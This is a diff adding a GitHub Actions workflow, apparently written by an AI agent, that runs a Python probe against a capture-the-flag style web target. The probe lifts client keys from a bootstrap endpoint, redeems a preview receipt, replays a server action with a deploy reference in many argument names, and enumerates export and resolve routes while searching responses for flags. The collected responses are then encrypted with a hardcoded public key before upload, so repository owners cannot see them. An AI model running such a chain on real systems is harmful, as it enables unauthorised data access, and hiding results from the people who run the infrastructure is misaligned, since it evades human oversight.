@@ -1,0 +1,79 @@
+name: launchlet-part3-statechain
+
+on:
+  push:
+    branches: [agent/launchlet-part3-statechain-20260808]
+
+permissions:
+  contents: read
+
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    timeout-minutes: 4
+    steps:
+      - name: Exercise receipt and deploy chain in one HTTP session and encrypt responses
+        shell: bash
+        run: |
+          set -euo pipefail
+          umask 077
+          mkdir -p package/out
+          cat > package/public.pem <<'PEM'
+          -----BEGIN PUBLIC KEY-----
+          MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAlOxaJs92lwtrdk6J2LR9
+          QeyG3A5H0rzGOQHw80MWPcOeEs5pzn37ilHloXnTkGk4PmJU67C06N9OOsgqU1kF
+          iydiljdl6RfwF/OSjMsNfRYsyBr1wONeO+9f+72VjLlNWqWVll2qeczrxppOulhJ
+          r+qBx95tdasvdCgh7aTShlkXF7e9+JjK19MrG+Lyj+I7B6bbTsp7D+PiJMlpepWk
+          hoz0jBO8Rgtodz7i/+9Z3RVVhqREdK3uA0Va5ia57Gp3hlvQGbjGxE6TC7q4s1/p
+          q6VF10bVOx8kwE2KggVgsX3uudJlzSvHV3f1coMdwyTSALsAjvAlZQwSts3eHjnF
+          SQIDAQAB
+          -----END PUBLIC KEY-----
+          PEM
+          python3 - <<'PY'
+          import requests,json,pathlib,re,urllib.parse
+          base='https://task-launchlet-web-medium-18cf6be4db586bb6.caplag-task.ru/'; out=pathlib.Path('package/out')
+          s=requests.Session(); s.headers['User-Agent']='Mozilla/5.0'
+          results=[]
+          def rec(name,r,sent=None):
+            item={'name':name,'status':r.status_code,'body':r.text,'headers':dict(r.headers),'cookies':s.cookies.get_dict()}
+            if sent is not None:item['sent']=sent
+            results.append(item)
+            flags=re.findall(r'caplag\{[^}]+\}',r.text)
+            new=[f for f in flags if f not in ('caplag{preview_manifest_kept_the_receipt}','caplag{anon_key_needs_real_rls}')]
+            if new:(out/'FOUND.txt').write_text('\n'.join(new)+'\n'+r.text)
+          b=s.get(base+'api/app/bootstrap',timeout=15).json(); mf=s.get(base+b['api']['buildManifest'].lstrip('/'),timeout=15).json(); refs=s.get(base+b['api']['serverReferences'].lstrip('/'),timeout=15).json(); a=refs['serverActions']['inspectDeploy']
+          auth={'Accept':'application/json','apikey':b['client']['anonKey'],'Authorization':'Bearer '+b['client']['session']}
+          # first successful redeem, preserve session/IP
+          rb={'receipt':mf['previewReceipt'],'project':b['project']}; r=s.post(base+mf['receiptRedeemEndpoint'].lstrip('/'),headers={**auth,'Content-Type':'application/json'},json=rb,timeout=10); rec('redeem',r,rb)
+          # action after redeem, with exact preview context
+          ab={'actionId':a['id'],'args':{'workspaceId':b['workspace'],'projectId':b['project']}}; ah={**auth,'Content-Type':'application/json','X-Launchlet-Preview':b['project']}; r=s.post(base+a['endpoint'].lstrip('/'),headers=ah,json=ab,timeout=10); rec('inspect_after_redeem',r,ab)
+          try:ref=r.json()['inspector']['deployRef']
+          except:ref='preview-8b11c'
+          # action again with ref in all natural args after redeem
+          for fld in ['deployRef','ref','capability','previewRef','deploymentRef','artifactRef','receipt']:
+            bb={'actionId':a['id'],'args':{'workspaceId':b['workspace'],'projectId':b['project'],fld:ref}}
+            rr=s.post(base+a['endpoint'].lstrip('/'),headers=ah,json=bb,timeout=10); rec('action_'+fld,rr,bb)
+          # targeted route family after redeem in same session
+          paths=['/api/deployments/export','/api/deployments/inspect','/api/deployments/resolve','/api/deploy/export','/api/deploy/resolve','/api/preview/export','/api/artifacts/export','/api/releases/export','/api/refs/resolve','/api/references/resolve','/api/deploy-refs/resolve','/api/deploy-refs/export']
+          for p in paths:
+            for method in ['GET','POST']:
+              if method=='GET': rr=s.get(base.rstrip('/')+p+'?'+urllib.parse.urlencode({'deployRef':ref}),headers={**auth,'X-Launchlet-Preview':b['project']},timeout=8,allow_redirects=False)
+              else: rr=s.post(base.rstrip('/')+p,headers={**ah},json={'deployRef':ref,'ref':ref,'project':b['project'],'workspace':b['workspace']},timeout=8,allow_redirects=False)
+              rec(method+' '+p,rr)
+          (out/'summary.json').write_text(json.dumps({'deployRef':ref,'results':results},indent=2))
+          PY
+          tar -C package/out -czf package/result.tgz .
+          openssl rand 32 > package/aes.key; openssl rand 16 > package/iv.bin
+          KEY_HEX="$(xxd -p -c 256 package/aes.key)"; IV_HEX="$(xxd -p -c 256 package/iv.bin)"
+          openssl enc -aes-256-cbc -K "$KEY_HEX" -iv "$IV_HEX" -in package/result.tgz -out package/result.enc
+          openssl pkeyutl -encrypt -pubin -inkey package/public.pem -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 -in package/aes.key -out package/key.enc
+          mkdir -p artifact
+          base64 -w0 package/result.enc > artifact/result.enc.b64
+          base64 -w0 package/key.enc > artifact/key.enc.b64
+          base64 -w0 package/iv.bin > artifact/iv.bin.b64
+          rm -rf package
+      - uses: actions/upload-artifact@v4
+        with:
+          name: launchlet-part3-statechain-encrypted
+          path: artifact/
+          retention-days: 1
